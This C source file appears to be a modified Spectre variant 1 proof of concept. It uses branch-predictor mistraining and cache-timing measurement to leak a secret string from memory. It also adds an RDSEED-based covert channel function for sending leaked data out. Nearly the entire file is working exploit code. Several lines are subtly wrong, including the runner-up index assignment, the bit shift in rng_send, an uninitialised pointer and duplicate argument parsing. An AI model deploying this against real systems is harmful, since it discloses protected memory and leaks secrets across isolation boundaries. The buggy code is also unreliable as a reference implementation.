#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <immintrin.h> // for rdseed
#include <unistd.h> // for usleep
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*512];

char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x) {
    if(x < array1_size) {
        temp &= array2[array1[x]*512];
    }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t * addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }
    for (tries = 999; tries > 0; tries --) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++){
            _mm_clflush(&array2[i * 512]); /* clflush */
        }

        /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x = training_x if j % 6 != 0
             * or malicious_x if j % 6 == 0
             *
             * Avoid jumps in case those tip off the branch predictor
             * Set x=FFF.FF0000 if j % 6 == 0, else x = 0 */
            x = ((j % 6) - 1) & ~0xFFFF;
            /* Set x = -1 if j & 6 = 0, else x = 0*/
            x = (x | (x >> 16 ));
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Mixed-up order to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = * addr;                   /* Time memory access */
            time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
            if (time2 <= CACHE_HIT_THRESHOLD &&
                    mix_i != array1[tries % array1_size]) {
                results[mix_i]++; /* cache hit -> score +1 for this value */
            }
        }

        /* Locate highest & second-highest results */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = 1;
            }
        }
        if (results[j] >= (2 * results[k] + 5) ||
                (results[j] == 2 && results[k] == 0)) {
                break;
        }
    }
    /* use junk to prevent code from being optimized out */
    results[0] ^= junk;
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}

void rng_send(char * msg) {
    // send the data contained in the array 'msg' through the rng conditioner
    int len = strnlen(msg, 255);
    int i, j;
    int x = 0x80;

    for (i = 0; i < len; i++) {
        for (j = 0; j < 8; j++) {
            // do the rdseed or don't
            if (((msg[i] & x) >> (7 - i)) == 1) {
                unsigned long long * p;
                int k, ret;
                for (k = 0; k < 256; k++) {
                    ret = _rdseed64_step(p);
                }
                usleep(10000);
            }
            else {
                usleep(100000);
            }
            x /= 2;
        }
    }
}

int main(int argc, const char ** argv) {
    size_t malicious_x =
        (size_t) (secret - (char *) array1); /* default for malicious_x */
    long unsigned int i;
    int score[2], len = 40;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++) {
        array2[i] = 1; /* write to array2 to ensure it is memory backed */
    }
    if (argc == 3) {
        sscanf(argv[1], "%p", (void **) (&malicious_x));
        malicious_x -= (size_t)array1; /* Input value to pointer */
        sscanf(argv[1], "%d", &len);
    }

    char possible_secret[41] = {0};
    while (--len >= 0) {
        readMemoryByte(malicious_x++, value, score);
        possible_secret[39-len] = value[0];
    }
    printf("%s\n", possible_secret);
    return(0);
}

